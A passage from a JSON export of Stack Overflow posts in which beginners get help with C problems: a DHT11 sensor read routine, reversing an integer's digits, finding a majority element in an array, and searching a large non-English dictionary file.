"body": "Please do not add screenshots of pure text. If your output is text, copy&amp;paste the text into your question. That&#39;s no artwork which requires images"}], "answers": [{"tags": [], "owner": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "is_accepted": false, "score": 0, "last_activity_date": 1499232052, "creation_date": 1499232052, "answer_id": 44917564, "question_id": 44917292, "link": "https://stackoverflow.com/questions/44917292/check-only-last-3-digits-of-sensor-output/44917564#44917564", "title": "Check only last 3 digits of sensor output", "body": "<p>No single variable in your code can hold \"255.255\", that would require a string or a float. You are obviously referring to the output of<br>\n<code>printf(\"%d.%d,%d.%d\\n\",dht11_val[0],dht11_val[1],dht11_val[2],dht11_val[3]);</code>.</p>\n\n<p>This printf can never produce a three-value output like <code>55,255.255</code>.\nI assume that your output would be <code>55.255,255.255</code>.<br>\nThis in turn means that in case of error you will find the \"last three digits\" in dht11_val[3].</p>\n\n<p>If my assumption is not correct please provide much more detail on the error circumstances.</p>\n\n<p>On the other hand, I suspect that looking for that value is not the solution for your problem either. The function is more complicated. The value of 255 seems the result of an endless loop which is detected by breaking early at counter = 255. So I am pretty sure that checking \"the last three digits\" is a LESS precise check than what is already implemented.</p>\n"}], "owner": {"reputation": 140, "user_id": 8043027, "user_type": "registered", "accept_rate": 40, "profile_image": "https://i.stack.imgur.com/wx4Zu.png?s=128&g=1", "display_name": "Josef B.", "link": "https://stackoverflow.com/users/8043027/josef-b"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 59, "favorite_count": 0, "answer_count": 1, "score": -2, "last_activity_date": 1500126658, "creation_date": 1499230582, "last_edit_date": 1500126658, "question_id": 44917292, "link": "https://stackoverflow.com/questions/44917292/check-only-last-3-digits-of-sensor-output", "title": "Check only last 3 digits of sensor output", "body": "<p>I have a library from WiringPi for DHT11 sensor and I need to modify condition which checks if the value read from sensor is good.  </p>\n\n<p>Sometimes the library reads bad values which are 255.255,255.255 or 55,255.255 etc.</p>\n\n<p><a href=\"https://i.stack.imgur.com/eBOOt.png\" rel=\"nofollow noreferrer\">sample output</a></p>\n\n<p>There is the condition in the library:</p>\n\n<pre><code>if(counter==255)\n        break;\n</code></pre>\n\n<p>But it doesn't work if the value is e.g. 55,255.255</p>\n\n<p>How can I modify this condition the check last 3 digits of output?\nIf the output is wrong, there are always \"255\" at the end of value.\nI tried to add conditions like</p>\n\n<pre><code>if(counter==255)\n        break;\n        else if(counter==255.255)\n        break;\n</code></pre>\n\n<p>But it doesn't solve all possible situations and I realy don't know anything about C/C++</p>\n\n<p>Here is the whole library:</p>\n\n<pre><code>#include &lt;wiringPi.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;stdint.h&gt;\n#define MAX_TIME 85\n#define DHT11PIN 7\n#define ATTEMPTS 5\nint dht11_val[5]={0,0,0,0,0};\n\nint dht11_read_val()\n{\n  uint8_t lststate=HIGH;\n  uint8_t counter=0;\n  uint8_t j=0,i;\n  for(i=0;i&lt;5;i++)\n     dht11_val[i]=0;\n  pinMode(DHT11PIN,OUTPUT);\n  digitalWrite(DHT11PIN,LOW);\n  delay(18);\n  digitalWrite(DHT11PIN,HIGH);\n  delayMicroseconds(40);\n  pinMode(DHT11PIN,INPUT);\n  for(i=0;i&lt;MAX_TIME;i++)\n  {\n    counter=0;\n    while(digitalRead(DHT11PIN)==lststate){\n      counter++;\n      delayMicroseconds(1);\n      if(counter==255)\n        break;\n    }\n    lststate=digitalRead(DHT11PIN);\n    if(counter==255)\n       break;\n    // top 3 transistions are ignored\n    if((i&gt;=4)&amp;&amp;(i%2==0)){\n      dht11_val[j/8]&lt;&lt;=1;\n      if(counter&gt;16)\n        dht11_val[j/8]|=1;\n      j++;\n    }\n  }\n  // verify checksum and print the verified data\n  if((j&gt;=40)&amp;&amp;(dht11_val[4]==((dht11_val[0]+dht11_val[1]+dht11_val[2]+dht11_val[3])&amp; 0xFF)))\n  {\n    printf(\"%d.%d,%d.%d\\n\",dht11_val[0],dht11_val[1],dht11_val[2],dht11_val[3]);\n    return 1;\n  }\n  else\n    return 0;\n}\n\nint main(void)\n{\n  int attempts=ATTEMPTS;\n  if(wiringPiSetup()==-1)\n    exit(1);\n  while(attempts)\n  {\n    int success = dht11_read_val();\n    if (success) {\n      break;\n    }\n    attempts--;\n    delay(500);\n  }\n  return 0;\n}\n</code></pre>\n"}, {"tags": ["c", "gcc"], "comments": [{"owner": {"reputation": 198293, "user_id": 707111, "user_type": "moderator", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/oXZkh.jpg?s=128&g=1", "display_name": "Ry-", "link": "https://stackoverflow.com/users/707111/ry"}, "edited": false, "score": 2, "creation_date": 1499227440, "post_id": 44916766, "comment_id": 76809650, "body": "<code>i &lt;= D-1, j &gt;= 0</code> throws out the result of the first comparison. Did you mean <code>&amp;&amp;</code> instead of <code>,</code>? Also, can you think of how you\u2019d do this without an array? It would make the program much faster and simpler."}, {"owner": {"reputation": 1, "user_id": 8238051, "user_type": "registered", "profile_image": "https://graph.facebook.com/1955957671288926/picture?type=large", "display_name": "Phuc Huy Nguyen Phuong", "link": "https://stackoverflow.com/users/8238051/phuc-huy-nguyen-phuong"}, "reply_to_user": {"reputation": 198293, "user_id": 707111, "user_type": "moderator", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/oXZkh.jpg?s=128&g=1", "display_name": "Ry-", "link": "https://stackoverflow.com/users/707111/ry"}, "edited": false, "score": 0, "creation_date": 1499228691, "post_id": 44916766, "comment_id": 76809958, "body": "I tended to do it using a string but my teacher has not allowed me to use library string.h ! So i am stuck with this method !"}, {"owner": {"reputation": 1, "user_id": 8238051, "user_type": "registered", "profile_image": "https://graph.facebook.com/1955957671288926/picture?type=large", "display_name": "Phuc Huy Nguyen Phuong", "link": "https://stackoverflow.com/users/8238051/phuc-huy-nguyen-phuong"}, "reply_to_user": {"reputation": 198293, "user_id": 707111, "user_type": "moderator", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/oXZkh.jpg?s=128&g=1", "display_name": "Ry-", "link": "https://stackoverflow.com/users/707111/ry"}, "edited": false, "score": 0, "creation_date": 1499229234, "post_id": 44916766, "comment_id": 76810110, "body": "@Ryan i have just added this to the for loop mistake that you found( without any changes from my original one) : printf(&quot;\\n %d&quot;,ReversedDigits[i]); and it still works out fine, the reversed digits are all correct ! I think that it is not an error there ."}, {"owner": {"reputation": 681, "user_id": 5994074, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dzK2Q.jpg?s=128&g=1", "display_name": "GAURANG VYAS", "link": "https://stackoverflow.com/users/5994074/gaurang-vyas"}, "edited": false, "score": 2, "creation_date": 1499230266, "post_id": 44916766, "comment_id": 76810417, "body": "@PhucHuyNguyenPhuong It can be done without using any string or array - Look <a href=\"http://www.geeksforgeeks.org/write-a-c-program-to-reverse-digits-of-a-number/\" rel=\"nofollow noreferrer\">here</a>."}, {"owner": {"reputation": 51, "user_id": 8026121, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/371086e6ed014b4274f0d7f7a06d8637?s=128&d=identicon&r=PG&f=1", "display_name": "ddannel", "link": "https://stackoverflow.com/users/8026121/ddannel"}, "edited": false, "score": 0, "creation_date": 1499263930, "post_id": 44916766, "comment_id": 76832746, "body": "The problem is related to pow. Try to print out (int)pow(10,2)...My solution is to use (int)powf(10.0,1.0*j)."}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1499301237, "post_id": 44916766, "comment_id": 76852304, "body": "you could force the user to enter a positive number by 1) declaring: <code>unsigned int number;</code>  and <code>scanf( &quot;u&quot;, &amp;number );</code>  However, need to check returned value from <code>scanf()</code> which in this scenario must be 1 otherwise an error occurred."}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1499301967, "post_id": 44916766, "comment_id": 76852472, "body": "this statement: if((Number/(int)pow(10,i)&lt;1)) will perform an integer divide, so will lose the fraction values thereby your result could be off by 1.  Suggest. save = 10; multiply (in a loop) save = i * save.  if save &gt; number then done else increment i and loop"}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1499302124, "post_id": 44916766, "comment_id": 76852516, "body": "it would have been much easier and much less error prone to read the number as a string, then just reverse the string. finally output the string."}, {"owner": {"reputation": 1, "user_id": 8238051, "user_type": "registered", "profile_image": "https://graph.facebook.com/1955957671288926/picture?type=large", "display_name": "Phuc Huy Nguyen Phuong", "link": "https://stackoverflow.com/users/8238051/phuc-huy-nguyen-phuong"}, "edited": false, "score": 0, "creation_date": 1499739871, "post_id": 44916766, "comment_id": 77022973, "body": "Thanks all for your help , i have figured out the mistake now !"}], "owner": {"reputation": 1, "user_id": 8238051, "user_type": "registered", "profile_image": "https://graph.facebook.com/1955957671288926/picture?type=large", "display_name": "Phuc Huy Nguyen Phuong", "link": "https://stackoverflow.com/users/8238051/phuc-huy-nguyen-phuong"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 224, "favorite_count": 1, "answer_count": 0, "score": 0, "last_activity_date": 1499227089, "creation_date": 1499227089, "question_id": 44916766, "link": "https://stackoverflow.com/questions/44916766/code-blocks-gives-wrong-solutions-while-online-compiler-doesnt", "title": "Code Blocks gives wrong solutions while online compiler doesn&#39;t", "body": "<p>everyone.</p>\n\n<p>I am using Code Blocks 16.01 , with the compiler GNU GCC . My current OS is 32-bit Windows 7.</p>\n\n<p>I am a newbie to C programming. These days , i have been working on a program that simply output the reversed number of the input positive integer .For example : with input 12345 , output will be 54321.</p>\n\n<p>Here are my codes:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\n#include &lt;math.h&gt;\n\nint main()\n{\n\n    int Number=0;\n    int i=0,j=0;\n    //Input\n    printf(\"\\nEnter your positive number:\\t\");\n    scanf(\" %d\",&amp;Number);\n    //Force a valid input\n    while (Number&lt;0){\n        printf(\"\\nInvalid input.\");\n        printf(\"\\nEnter your positive number:\\t\");\n        scanf(\" %d\",&amp;Number);\n    }\n    //Identifying the number of digits\n    for (i=1;;i++){\n        if((Number/(int)pow(10,i)&lt;1))break;//Dividing for 10 until the result is &lt; 1 then break\n    }\n    printf(\"\\nYour input number is %d digits long.\\n\",i);\n    //Preparing for the reverse process\n    int D=i;\n    int NUMBER[D+1];\n    int Num1=Number;\n    i=D-1;j=0;\n\n    //Extracting the digits from the number\n    for(i=D-1;i&gt;=0;i--){\n    NUMBER[i]=Num1%10;\n    Num1=Num1/10;\n    }\n    int ReversedDigits[D+1];\n    int ReversedNumber=0;\n\n    for(i=0,j=D-1;i&lt;=D-1,j&gt;=0;i++,j--){\n        ReversedDigits[i]=NUMBER[j];\n        ReversedNumber+=ReversedDigits[i]*(int)pow(10,j);\n    }\n    printf(\"\\nThe reversed number is %d.\\n\",ReversedNumber);\n\n}\n</code></pre>\n\n<p>I compiled and ran the program , input 1234 but instead of having 4321 as output, i got 4318 in return (You can check the image included).<a href=\"https://i.stack.imgur.com/Tye5H.png\" rel=\"nofollow noreferrer\">The program ran and compiled using Code Blocks.</a></p>\n\n<p>I have looked for logical error and couldn't find them anywhere .</p>\n\n<p>Then i copied the code to compile it online . I use the page :<a href=\"https://www.codechef.com/ide\" rel=\"nofollow noreferrer\">https://www.codechef.com/ide</a> to compile my code with compiler C (GCC-4.9.2)\nand it gives a perfect output.(You can copy and run my codes on that page to verify ).</p>\n\n<p>So i reached a conclusion that something is wrong with my Code Blocks.</p>\n\n<p>I have re-installed Code Blocks on my laptop but that doesn't help at all . The problem still remained .</p>\n\n<p>Does anyone have any idea of why this happen and how to fix it ? I would greatly appreciate any help there is . </p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 16936, "user_id": 7076153, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/erPUC.png?s=128&g=1", "display_name": "Stargateur", "link": "https://stackoverflow.com/users/7076153/stargateur"}, "edited": false, "score": 4, "creation_date": 1499224934, "post_id": 44916527, "comment_id": 76809121, "body": "You know that you hard coded <code>n = 6</code> ?"}, {"owner": {"reputation": 7381, "user_id": 7802200, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Adik7.png?s=128&g=1", "display_name": "Arya McCarthy", "link": "https://stackoverflow.com/users/7802200/arya-mccarthy"}, "edited": false, "score": 0, "creation_date": 1499225000, "post_id": 44916527, "comment_id": 76809136, "body": "What <i>should</i> it do when there&#39;s no majority element, assuming it&#39;s written the way you want? You&#39;ve included no logic to handle that case."}, {"owner": {"reputation": 681, "user_id": 5994074, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dzK2Q.jpg?s=128&g=1", "display_name": "GAURANG VYAS", "link": "https://stackoverflow.com/users/5994074/gaurang-vyas"}, "edited": false, "score": 0, "creation_date": 1499226692, "post_id": 44916527, "comment_id": 76809490, "body": "Correct version of your code will have complexity  - <code>O(n^2)</code>. Check for more <a href=\"http://www.geeksforgeeks.org/majority-element/\" rel=\"nofollow noreferrer\">efficient solution</a>"}], "answers": [{"comments": [{"owner": {"reputation": 681, "user_id": 5994074, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dzK2Q.jpg?s=128&g=1", "display_name": "GAURANG VYAS", "link": "https://stackoverflow.com/users/5994074/gaurang-vyas"}, "edited": false, "score": 0, "creation_date": 1499226550, "post_id": 44916649, "comment_id": 76809450, "body": "No need to use <code>isFound</code>, we can check the same through <code>i&gt;=n</code>. <code>if(i&gt;=n)</code> then no majority element else there is a majority element."}, {"owner": {"reputation": 6288, "user_id": 5167682, "user_type": "registered", "accept_rate": 29, "profile_image": "https://i.stack.imgur.com/2vexc.jpg?s=128&g=1", "display_name": "roottraveller", "link": "https://stackoverflow.com/users/5167682/roottraveller"}, "reply_to_user": {"reputation": 681, "user_id": 5994074, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dzK2Q.jpg?s=128&g=1", "display_name": "GAURANG VYAS", "link": "https://stackoverflow.com/users/5994074/gaurang-vyas"}, "edited": false, "score": 0, "creation_date": 1499235942, "post_id": 44916649, "comment_id": 76812782, "body": "@GAURANGVYAS yes, thats another way :)"}], "tags": [], "owner": {"reputation": 6288, "user_id": 5167682, "user_type": "registered", "accept_rate": 29, "profile_image": "https://i.stack.imgur.com/2vexc.jpg?s=128&g=1", "display_name": "roottraveller", "link": "https://stackoverflow.com/users/5167682/roottraveller"}, "is_accepted": false, "score": 0, "last_activity_date": 1499226118, "creation_date": 1499226118, "answer_id": 44916649, "question_id": 44916527, "link": "https://stackoverflow.com/questions/44916527/majority-element-in-an-array-it/44916649#44916649", "title": "Majority element in an array.It", "body": "<pre><code>#include &lt;stdio.h&gt;\nint main() {\n    int maj, count, n = 7; //n is size of arr\n    int arr[] = {1, 2, 2, 2, 2, 3, 4};\n    int isFound = 0; //0 -&gt; false, 1 -&gt; true\n\n    for (int i = 0; i &lt; n; i++) {\n        maj = arr[i];\n        count = 1;  //first elements is itself\n        isFound = 0;  //by default we assume that no major elements is found\n\n        for (int j = i+1; j &lt; n; j++) { //iterate from next elements onwards to right in array\n            if (arr[j] == maj) count++;\n        }\n        if (count &gt; n / 2) {\n            isFound = 1;\n            break; //major elements found; no need to iterator further; just break the loop now\n        }\n    }\n    if(isFound)   printf(\"%d \", maj);\n    else printf(\"no major element\");\n    return 0;\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 219634, "user_id": 2877241, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/63d17ecdadc8917254be4fb70e86246b?s=128&d=identicon&r=PG&f=1", "display_name": "Vlad from Moscow", "link": "https://stackoverflow.com/users/2877241/vlad-from-moscow"}, "is_accepted": false, "score": 0, "last_activity_date": 1499229422, "creation_date": 1499229422, "answer_id": 44917118, "question_id": 44916527, "link": "https://stackoverflow.com/questions/44916527/majority-element-in-an-array-it/44917118#44917118", "title": "Majority element in an array.It", "body": "<p>For starters according to the C Standard function main without parameters shall be declared like</p>\n\n<pre><code>int main( void )\n</code></pre>\n\n<p>Try not to use magic numbers. Usually as in your program they are a reason for program bugs. For example you declared the array <code>arr</code> as having 7 elements however the variable <code>n</code> that should keep the number of elements in the array is initialized with the value <code>6</code>. Another magic number <code>9</code> is used in the loop</p>\n\n<pre><code>for (int j = 9; j &lt; n; j++) {\n            ^^^\n</code></pre>\n\n<p>There is no need to write the outer loop that travers the whole array. Also the program does not report the case when the majority number does not exist in the array.</p>\n\n<p>Using your approach with two loops the program can look the following way</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nint main( void ) \n{\n    int a[] = { 1, 2, 2, 2, 2, 3, 4 };\n    const size_t N = sizeof( a ) / sizeof( *a );\n\n    size_t i = 0;\n    for ( ; i &lt; ( N + 1 ) / 2; i++ )\n    {\n        size_t count = 1;\n        for ( size_t j = i + 1; count &lt; N / 2 + 1 &amp;&amp; j &lt; N; j++ )\n        {\n            if ( a[i] == a[j] ) ++count;\n        }\n\n        if ( !( count &lt; N / 2 + 1) ) break;\n    }\n\n    if ( i != ( N + 1 ) / 2 )\n    {\n        printf( \"The majority is %d\\n\", a[i] );\n    }\n    else\n    {\n        puts( \"There is no majority element\" );\n    }\n\n    return 0;\n}\n</code></pre>\n\n<p>Its output is</p>\n\n<pre><code>The majority is 2\n</code></pre>\n"}], "owner": {"reputation": 1, "user_id": 8256612, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-KwWYL9un2MQ/AAAAAAAAAAI/AAAAAAAAABo/sQNM2rJh_sQ/photo.jpg?sz=128", "display_name": "Harman Chadha", "link": "https://stackoverflow.com/users/8256612/harman-chadha"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 119, "favorite_count": 0, "answer_count": 2, "score": -1, "last_activity_date": 1499753612, "creation_date": 1499224816, "last_edit_date": 1499225994, "question_id": 44916527, "link": "https://stackoverflow.com/questions/44916527/majority-element-in-an-array-it", "title": "Majority element in an array.It", "body": "<pre><code>#include &lt;stdio.h&gt;\n\nvoid main()\n{\n    int maj, count, n = 6;\n    int arr[] = {1, 2, 2, 2, 2, 3, 4};\n\n    for (int i = 0; i &lt; n; i++) {\n        maj = arr[i];\n        count = 0;\n        for (int j = 9; j &lt; n; j++) {\n            if (arr[j] == maj) count++;\n        }\n        if (count &gt; n / 2) {\n            break; /* I think some problem is here ,if majority element not found then it takes last element as the majority element */\n        }\n    }\n    printf(\"%d\", maj);\n}\n</code></pre>\n\n<p>It is giving correct output if majority ellement is there but incorrect output if no majority element is there for example if array is {1,2,3,4} it is giving output as 4. please help!!</p>\n"}, {"tags": ["c", "file", "dictionary", "search"], "comments": [{"owner": {"reputation": 5721, "user_id": 3823831, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e10a2607a7827988b6ac570fe168e02a?s=128&d=identicon&r=PG", "display_name": "TheGreatContini", "link": "https://stackoverflow.com/users/3823831/thegreatcontini"}, "edited": false, "score": 0, "creation_date": 1499223935, "post_id": 44916393, "comment_id": 76808897, "body": "What is your goal?  Faster search?  Less memory?  You may want to look into <a href=\"https://en.wikipedia.org/wiki/Trie\" rel=\"nofollow noreferrer\">tries</a>."}, {"owner": {"reputation": 49, "user_id": 7751766, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-sfQ7SzQlAzI/AAAAAAAAAAI/AAAAAAAAABc/XT6Dyj-ZJJw/photo.jpg?sz=128", "display_name": "ENE KaIku", "link": "https://stackoverflow.com/users/7751766/ene-kaiku"}, "reply_to_user": {"reputation": 5721, "user_id": 3823831, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e10a2607a7827988b6ac570fe168e02a?s=128&d=identicon&r=PG", "display_name": "TheGreatContini", "link": "https://stackoverflow.com/users/3823831/thegreatcontini"}, "edited": false, "score": 1, "creation_date": 1499224147, "post_id": 44916393, "comment_id": 76808940, "body": "@TheGreatContini is it too large for Chinese? There are over 20000 chinese characters in unicode, emm ms level of search and usage of memory is as small as possible?"}, {"owner": {"reputation": 42504, "user_id": 1161878, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/0157ddd785dc01e95342e3661d34b42a?s=128&d=identicon&r=PG", "display_name": "Gene", "link": "https://stackoverflow.com/users/1161878/gene"}, "edited": false, "score": 1, "creation_date": 1499226094, "post_id": 44916393, "comment_id": 76809358, "body": "@ENEKaIku One million 32-byte words is tiny in most modern environments. As TheGreatContini asked, what are you trying to achieve?  You need to do some research on simple search data structures.  It&#39;s easily possible to build a trie for an arbitrarily large alphabet by hashing the edge labels. With a trie constructed in this manner, looking up a word of N characters requires time proportional to N with a very small constant factor. The size of the dictionary doesn&#39;t matter. If you don&#39;t like tries, then simple hash tables and binary search trees will both do much better than your algorithm."}, {"owner": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "edited": false, "score": 0, "creation_date": 1499226162, "post_id": 44916393, "comment_id": 76809364, "body": "Your approach isn&#39;t bad at all. My first thought would be to use a simple array with the number of elements equal to the number of characters in the language you are using (I have no idea how many that is for Chinese or Japanese). For each element, you could store the beginning offset as you are doing. You would know the size of each block by subtracting the offset in <code>array[x+1] - array[x]</code> for example. You could then use the first char in the word to identify the block and read it into memory for searching (you could delay <code>free</code> until next search and check to reuse the current block)."}, {"owner": {"reputation": 49, "user_id": 7751766, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-sfQ7SzQlAzI/AAAAAAAAAAI/AAAAAAAAABc/XT6Dyj-ZJJw/photo.jpg?sz=128", "display_name": "ENE KaIku", "link": "https://stackoverflow.com/users/7751766/ene-kaiku"}, "reply_to_user": {"reputation": 42504, "user_id": 1161878, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/0157ddd785dc01e95342e3661d34b42a?s=128&d=identicon&r=PG", "display_name": "Gene", "link": "https://stackoverflow.com/users/1161878/gene"}, "edited": false, "score": 0, "creation_date": 1499226944, "post_id": 44916393, "comment_id": 76809543, "body": "@Gene Thanks! But how to store the trie or hash tables? Is it the same as block search, I have to get the file offset as &quot;pointer&quot; and store it into another file?"}, {"owner": {"reputation": 49, "user_id": 7751766, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-sfQ7SzQlAzI/AAAAAAAAAAI/AAAAAAAAABc/XT6Dyj-ZJJw/photo.jpg?sz=128", "display_name": "ENE KaIku", "link": "https://stackoverflow.com/users/7751766/ene-kaiku"}, "edited": false, "score": 0, "creation_date": 1499227300, "post_id": 44916393, "comment_id": 76809624, "body": "Got it!!!! Thank all of you so much!!!!"}, {"owner": {"reputation": 42504, "user_id": 1161878, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/0157ddd785dc01e95342e3661d34b42a?s=128&d=identicon&r=PG", "display_name": "Gene", "link": "https://stackoverflow.com/users/1161878/gene"}, "edited": false, "score": 0, "creation_date": 1499299423, "post_id": 44916393, "comment_id": 76851897, "body": "It&#39;s likely there are <i>many</i> better algorithms than the one you&#39;ve proposed. But we can&#39;t say because you still haven&#39;t explained your goals. If you&#39;re doing many lookups, then you should <i>read all the data into an efficient search structure in memory</i>, not mess around with direct access through byte offsets in files.  The only reason to avoid an in-memory structure is that your environment is so constrained that ~50Mb for a search structure is too much memory. We can&#39;t answer your question if you don&#39;t explain what you need. Voting to close because the question is unclear."}], "answers": [{"comments": [{"owner": {"reputation": 49, "user_id": 7751766, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-sfQ7SzQlAzI/AAAAAAAAAAI/AAAAAAAAABc/XT6Dyj-ZJJw/photo.jpg?sz=128", "display_name": "ENE KaIku", "link": "https://stackoverflow.com/users/7751766/ene-kaiku"}, "edited": false, "score": 0, "creation_date": 1499224973, "post_id": 44916495, "comment_id": 76809129, "body": "Thanks! But how to store this? I mean if I want to use this record every time, then do I have to load this from file into memory?"}, {"owner": {"reputation": 300, "user_id": 8243878, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5a342072e9493c58c8405868e2784ee1?s=128&d=identicon&r=PG&f=1", "display_name": "jschmerge", "link": "https://stackoverflow.com/users/8243878/jschmerge"}, "reply_to_user": {"reputation": 49, "user_id": 7751766, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-sfQ7SzQlAzI/AAAAAAAAAAI/AAAAAAAAABc/XT6Dyj-ZJJw/photo.jpg?sz=128", "display_name": "ENE KaIku", "link": "https://stackoverflow.com/users/7751766/ene-kaiku"}, "edited": false, "score": 0, "creation_date": 1499226528, "post_id": 44916495, "comment_id": 76809445, "body": "You would read &amp; parse your file, storing nothing but the keys &amp; offsets in the array-of-structures I mentioned previously... From there, retrieving the record data would be an open/seek/read sequence, or getting fancier, you could also mmap() the file region referenced by the offset."}, {"owner": {"reputation": 300, "user_id": 8243878, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5a342072e9493c58c8405868e2784ee1?s=128&d=identicon&r=PG&f=1", "display_name": "jschmerge", "link": "https://stackoverflow.com/users/8243878/jschmerge"}, "reply_to_user": {"reputation": 49, "user_id": 7751766, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-sfQ7SzQlAzI/AAAAAAAAAAI/AAAAAAAAABc/XT6Dyj-ZJJw/photo.jpg?sz=128", "display_name": "ENE KaIku", "link": "https://stackoverflow.com/users/7751766/ene-kaiku"}, "edited": false, "score": 0, "creation_date": 1499226783, "post_id": 44916495, "comment_id": 76809507, "body": "... you could conceivably also write your index array out to a separate file as well that you could load/update/store as binary data. The old dbm/ndbm/gdbm file-backed databases did something very similar."}], "tags": [], "owner": {"reputation": 300, "user_id": 8243878, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5a342072e9493c58c8405868e2784ee1?s=128&d=identicon&r=PG&f=1", "display_name": "jschmerge", "link": "https://stackoverflow.com/users/8243878/jschmerge"}, "is_accepted": false, "score": 0, "last_activity_date": 1499224549, "creation_date": 1499224549, "answer_id": 44916495, "question_id": 44916393, "link": "https://stackoverflow.com/questions/44916393/how-to-do-million-level-dictionary-search-non-english/44916495#44916495", "title": "How to do Million level Dictionary Search **(Non-English)**", "body": "<p>My first thought on this is that a million is not a big number for this sort of data set size. Using a basic balanced binary search should be log2(million) compares, or about 20 compares per search. Keeping it as simple as possible, I would read the 32-byte keys into an array of structures that contain (key, file offset):</p>\n\n<pre><code>struct record {\n  uint8_t key[32];\n  uint8_t key_length;\n  uint64_t file_offset;\n};\n\n#define MAX_RECORDS 1000000\n\nstruct record my_index[MAX_RECORDS];\n</code></pre>\n\n<p>Then ensure that 'my_index' array is sorted by key, which can be simply accomplished using the standard libraries qsort() function (<a href=\"https://linux.die.net/man/3/qsort\" rel=\"nofollow noreferrer\">https://linux.die.net/man/3/qsort</a>). Once that is done, you may implement a divide-and-conquer binary array search following the algorithm laid out here <a href=\"https://en.wikipedia.org/wiki/Binary_search_algorithm\" rel=\"nofollow noreferrer\">https://en.wikipedia.org/wiki/Binary_search_algorithm</a> ... This algorithm is implemented by the standard C library's bsearch() function (<a href=\"https://linux.die.net/man/3/bsearch\" rel=\"nofollow noreferrer\">https://linux.die.net/man/3/bsearch</a>).</p>\n"}], "owner": {"reputation": 49, "user_id": 7751766, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-sfQ7SzQlAzI/AAAAAAAAAAI/AAAAAAAAABc/XT6Dyj-ZJJw/photo.jpg?sz=128", "display_name": "ENE KaIku", "link": "https://stackoverflow.com/users/7751766/ene-kaiku"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 55, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1499224549, "creation_date": 1499223619, "question_id": 44916393, "link": "https://stackoverflow.com/questions/44916393/how-to-do-million-level-dictionary-search-non-english", "title": "How to do Million level Dictionary Search **(Non-English)**", "body": "<p>There is a dictionary csv file, <strong>million level data &amp; not English(Chinese or Japanese for example)</strong>, the biggest word is up to <strong>32bytes</strong></p>\n\n<p>Everytime I want to search word in the file.</p>\n\n<p>Now my solution is <strong>Block Search</strong>:</p>\n\n<ol>\n<li>First sort the data</li>\n<li>Then and I split N datas into Sqrt(N) Blocks and get <strong>file offset</strong> of the first data in every Blocks using <strong>ftell in C</strong>, then store them in a Index file in this way: (word), (offset in dict)</li>\n<li>Every time I get a word search request, I <strong>open the Index file and read line one by one</strong> until I find that this word is in this Block, then I use <strong>fseek to relocate to that block's first data at the dict file, and then read line one by one</strong> until I find the data in the dict.</li>\n</ol>\n\n<p>Is this solution appropriate or is there any space to improve?\nOr is there any other solutions? I don't know how to use hash or tree to search data in a file. Do I have to remake them at request?\nThanks!!!!!</p>\n"}, {"tags": ["c", "arrays", "struct"], "comments": [{"owner": {"reputation": 9846, "user_id": 1745544, "user_type": "registered", "accept_rate": 23, "profile_image": 